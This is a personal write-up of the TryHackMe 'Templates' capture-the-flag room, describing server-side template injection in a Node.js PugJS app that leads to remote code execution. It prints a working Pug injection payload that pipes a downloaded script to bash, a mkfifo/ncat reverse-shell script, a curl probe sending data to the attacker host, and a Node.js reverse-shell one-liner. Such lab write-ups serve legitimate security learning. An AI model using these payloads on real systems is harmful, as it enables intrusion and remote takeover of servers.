---
title: "Lab Write-Up: TryHackMe - Templates"
categories: [Cybersecurity Labs]
---
## Overview

**Lab:** [TryHackMe / Templates](https://tryhackme.com/room/templates)

**Type:** Web

**TL;DR:** Server-side template injection in a Node.js (PugJS) application leads
to remote code execution

## Questions
- Hack the application and uncover a flag!

## Initial Scan

I started out with an obligatory nmap scan just to see some information on what
services were running.

```
root@ip-10-80-70-120:~# nmap -p- -A -T4 templates.thm -n
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-16 21:36 GMT
Nmap scan report for templates.thm (10.81.165.182)
Host is up (0.00019s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: PUG to HTML
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/16%OT=22%CT=1%CU=30455%PV=Y%DS=1%DC=T%G=Y%TM=696AAF7
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M23
OS:01ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4
OS:B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=
OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
OS:T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   0.26 ms 10.81.165.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.65 seconds
```

The scan didn't really yield much more information than what I already knew -
port 5000 is open as a web service.  The only additional bit of info was that
it's a node, specifically express, application.

## The Application

Taking a look at the application running, it was taking input in the form of a
PugJS template and converting it to HTML.  That means all I needed to do was
figure out how to run code, presumably JavaScript, via PugJS.

## Research

I had originally assumed that Pug was a made-up templating system, but figured
I'd do a quick Google search, anyway.  I found out that it is real - the
documentation can be found [here](https://pugjs.org/api/getting-started.html).

I read through the documentation a little bit looking for interesting bits of
syntax.  The first thing I looked at was the [includes](https://pugjs.org/language/includes.html)
section.  I tried a couple payloads, but nothing was really working out so I
moved on.  That's when I found the [interpolation](https://pugjs.org/language/interpolation.html)
section.  It lets you run any JavaScript expression and send the results to
the screen.

## Exploit Attempt 1

I decided to go to [HackTricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/ssti-server-side-template-injection/README.md)
to see if they had a node payload I could use and they actually had one
specifically targetting PugJS (splitting into separate lines for readability).

```javascript
#{
    function(){
        localLoad=global.process.mainModule.constructor._load;
        sh=localLoad("child_process").exec('curl 10.81.72.206:8001/s.sh | bash')
    }()
}
```

I updated the URL to the AttackBox IP, set up a shell script called `s.sh` (from
[revshells](https://www.revshells.com/)):

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.80.70.120 1337 >/tmp/f
```

I then served it via `python3 -m http.server 8001` and set up a listener: `nc
-lnvp 1337`

I ran the payload and got...nothing in the listener.  I saw it pulled the `s.sh`
file so I started wondering what happened.

## Troubleshooting

I knew that CURL worked so I updated the script to see what was going on:

```bash
curl http://10.81.72.206:8001/hmm?d=$(which curl)
```

I saw the following request come through:

```http
GET /hmm?d=/usr/bin/curl HTTP/1.1
```

So it was executing, but it just wasn't actually working.  I decided to check if
netcat was even installed by updating to `which nc` and got nothing.  So it's at
least not called `nc`.  I tried `ncat` and `busybox` as well and still nothing.

## Solution

The one thing I did know for sure it had was node so I decided I'd look to see
what direct node shells there were.  I found this post with a one-liner that I
could use: [medium article by sylsTyping](https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73)

I updated the script for my IP and port:

```bash
node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(1337, "10.81.72.206", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'
```

I re-ran the payload and got a connection!

```
root@ip-10-81-72-206:~# nc -lnvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.81.165.182 34158
```

`whoami` confirmed that I had a shell connection so I ran an `ls` and found
`flag.txt` which held the flag I needed to finish the room.

## Reflection

This was kind of a "gimme" challenge, but it was a nice confirmation that the
notes and resources I've been tracking provide me with good leads.  I also got
yet another resource from the above medium article: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

While this wasn't a very realistic challenge, I have seen "demo" links that do
similar, albeit typically more locked down.  Likewise, given administrative
access to a CMS, it isn't too far-fetched that you'd be able to update templates
in this manner.
